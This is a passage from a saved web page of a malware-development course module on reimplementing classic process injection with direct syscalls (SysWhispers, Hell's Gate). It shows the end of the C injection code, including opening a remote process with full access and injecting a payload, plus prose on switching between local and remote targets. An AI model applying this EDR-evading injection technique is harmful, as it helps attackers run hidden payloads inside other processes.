		return 0x1;
#endif // LOCAL_INJECTION

// If remote injection
#ifdef REMOTE_INJECTION
	// Open a handle to the target process
	printf("[i] Targeting process of id : %d \n", PROCESS_ID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
	if (hProcess == NULL) {
		printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
		return -1;
	}

	if (!ClassicInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
		return 0x1;

#endif // REMOTE_INJECTION

	return 0x00;
}
</code></pre>
<h3>Local vs Remote Injection</h3>
<p>Since the implemented <code>ClassicInjectionViaSyscalls</code> can 
work on both the local process and the remote process level, a 
preprocessor macro code was constructed to target the local process if <code>LOCAL_INJECTION</code> is defined. The preprocessor code is shown below.</p>
<pre><code>#define LOCAL_INJECTION

#ifndef LOCAL_INJECTION
#define REMOTE_INJECTION
// Set the target process PID
#define PROCESS_ID	18784	
#endif // !LOCAL_INJECTION
</code></pre>
<p>The <code>#define LOCAL_INJECTION</code> can be commented out to target a remote process. In this case, the process of PID equal to <code>PROCESS_ID</code> will be targeted. If <code>#define LOCAL_INJECTION</code>
 is not commented, which is the default setting in the shared code, then
 the local process's pseudo handle is used which is equal to <code>(HANDLE)-1</code>.</p>
<h3>Demo</h3>
<p>Using the SysWhispers implementation locally.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-714361294-3e6b766a-57cc-4a05-b788-fe53e9cdc.png" alt="image"></p>
<p>Using SysWhispers implementation remotely.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-814362613-395c4f9f-05c5-4a0a-9325-4f2deedaf.png" alt="image"></p>
<p>Using Hell's Gate implementation locally.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-914361542-8212a53a-8c06-4a9f-ba93-4bf8add3a.png" alt="image"></p>
<p>Using Hell's Gate implementation remotely.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/syscalls-classic-9214363039-c409bb06-27a1-433e-a06b-3617828b.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand
 the usage and parameters of the NtAllocateVirtualMemory, 
NtWriteVirtualMemory, NtProtectVirtualMemory and NtCreateThreadEx 
syscalls</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement classical injection using SysWhispers and Hell's Gate</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Modify the preprocessor macro to target a remote process</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/66"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/67/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/67/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/68"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/jquery-3.6.0.min.js"></script>
        <script src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/app.4474f4d1.css"><link rel="modulepreload" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/app.5f3af5ce.js"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/app.4474f4d1.css"><script type="module" src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/app.5f3af5ce.js"></script><script src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/navbar.js"></script>
<script src="Syscalls%20-%20Reimplementing%20Classic%20Injection_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 67;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>